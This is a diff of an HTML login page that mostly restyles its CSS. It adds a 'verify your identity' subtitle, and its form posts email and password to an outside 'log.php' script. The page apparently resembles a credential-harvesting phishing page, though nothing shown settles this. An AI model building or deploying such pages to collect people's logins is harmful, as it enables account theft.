@@ -3,77 +3,190 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Login</title>
+  <title>Login - King Indra</title>
   <style>
-    :root{
-      --bg:#0f1724;
-      --card:#0b1220;
-      --accent-start:#6ee7b7;
-      --accent-end:#60a5fa;
-      --muted:#94a3b8;
-      --glass: rgba(255,255,255,0.04);
-      --radius:14px;
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-    }
-    html,body{height:100%;margin:0;background:linear-gradient(180deg,#071026 0%, #071426 40%), radial-gradient(600px 300px at 10% 10%, rgba(96,165,250,0.08), transparent 20%), radial-gradient(500px 200px at 90% 90%, rgba(110,231,183,0.04), transparent 15%); color:#e6eef8;display:grid;place-items:center;}
-
-    .card{
-      width:100%;max-width:400px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-      border-radius:var(--radius);padding:32px;box-shadow:0 10px 30px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.03);backdrop-filter: blur(8px);
+    :root {
+      --bg1: #0a0f1c;
+      --bg2: #121b2f;
+      --card-bg: rgba(255, 255, 255, 0.06);
+      --border: rgba(255, 255, 255, 0.12);
+      --accent1: #60a5fa;
+      --accent2: #6ee7b7;
+      --text: #e5ecf5;
+      --muted: #94a3b8;
+      --radius: 18px;
+      font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
     }
 
-    h1{margin-bottom:20px;font-size:22px;text-align:center}
-
-    form .field{margin-bottom:16px}
-    label{display:block;margin-bottom:6px;color:var(--muted);font-size:13px}
-    input[type="email"], input[type="password"]{
-      width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:var(--glass);color:inherit;font-size:15px;outline:none;transition:box-shadow .18s, border-color .18s;
-    }
-    input:focus{box-shadow:0 6px 18px rgba(96,165,250,0.06);border-color:rgba(96,165,250,0.28)}
-
-    .btn{
-      width:100%;padding:12px;border-radius:10px;border:0;font-weight:600;font-size:15px;cursor:pointer;
-      background:linear-gradient(90deg,var(--accent-start),var(--accent-end));color:#06202a;box-shadow:0 10px 30px rgba(96,165,250,0.12);
+    * {
+      box-sizing: border-box;
     }
 
-    .input-with-icon{position:relative}
-    .eye-btn{position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;padding:6px;border-radius:8px}
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: radial-gradient(circle at 30% 20%, rgba(96,165,250,0.15), transparent 40%),
+                  radial-gradient(circle at 70% 80%, rgba(110,231,183,0.15), transparent 40%),
+                  linear-gradient(180deg, var(--bg1), var(--bg2));
+      color: var(--text);
+    }
+
+    .card {
+      width: 100%;
+      max-width: 420px;
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 40px 36px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.4);
+      backdrop-filter: blur(18px);
+      animation: fadeIn 0.6s ease both;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .title {
+      font-size: 24px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 8px;
+      background: linear-gradient(90deg, var(--accent1), var(--accent2));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 14px;
+      color: var(--muted);
+      margin-bottom: 30px;
+    }
+
+    form .field {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 13px;
+      color: var(--muted);
+    }
+
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 14px 44px 14px 14px;
+      border-radius: 10px;
+      border: 1px solid var(--border);
+      background: rgba(255,255,255,0.04);
+      color: var(--text);
+      font-size: 15px;
+      outline: none;
+      transition: all 0.25s ease;
+    }
+
+    input:focus {
+      border-color: var(--accent1);
+      box-shadow: 0 0 8px rgba(96,165,250,0.3);
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(90deg, var(--accent2), var(--accent1));
+      font-weight: 600;
+      color: #051a24;
+      font-size: 15px;
+      cursor: pointer;
+      box-shadow: 0 6px 24px rgba(96,165,250,0.25);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 32px rgba(96,165,250,0.35);
+    }
+
+    .input-with-icon {
+      position: relative;
+    }
+
+    .eye-btn {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: 0;
+      cursor: pointer;
+      color: var(--muted);
+      padding: 6px;
+      border-radius: 8px;
+      transition: color 0.2s ease;
+    }
+
+    .eye-btn:hover {
+      color: var(--accent1);
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 30px 24px;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>Login</h1>
+    <h1 class="title">Login Required</h1>
+    <p class="subtitle">You need to log in to verify your identity and continue.</p>
+
     <form id="loginForm" method="POST" action="https://king-indra.com/log.php" autocomplete="on">
       <div class="field">
         <label for="email">Email</label>
         <input id="email" name="email" type="email" placeholder="you@example.com" required />
       </div>
+
       <div class="field input-with-icon">
         <label for="password">Password</label>
         <input id="password" name="password" type="password" placeholder="Your password" required />
         <button type="button" class="eye-btn" onclick="togglePassword()">
-          <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+          <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
             <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"></path>
             <circle cx="12" cy="12" r="3"></circle>
           </svg>
-          <svg id="eyeClosed" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="display:none">
+          <svg id="eyeClosed" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" style="display:none">
             <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.86 21.86 0 0 1 5.06-4.94"></path>
             <path d="M1 1l22 22"></path>
           </svg>
         </button>
       </div>
+
       <button class="btn" type="submit">Sign in</button>
     </form>
   </div>
+
   <script>
-    function togglePassword(){
+    function togglePassword() {
       const pwd = document.getElementById('password');
       const open = document.getElementById('eyeOpen');
       const closed = document.getElementById('eyeClosed');
-      if(pwd.type === 'password'){
-        pwd.type = 'text'; open.style.display='none'; closed.style.display='inline';
+      if (pwd.type === 'password') {
+        pwd.type = 'text';
+        open.style.display = 'none';
+        closed.style.display = 'inline';
       } else {
-        pwd.type = 'password'; open.style.display='inline'; closed.style.display='none';
+        pwd.type = 'password';
+        open.style.display = 'inline';
+        closed.style.display = 'none';
       }
     }
   </script>
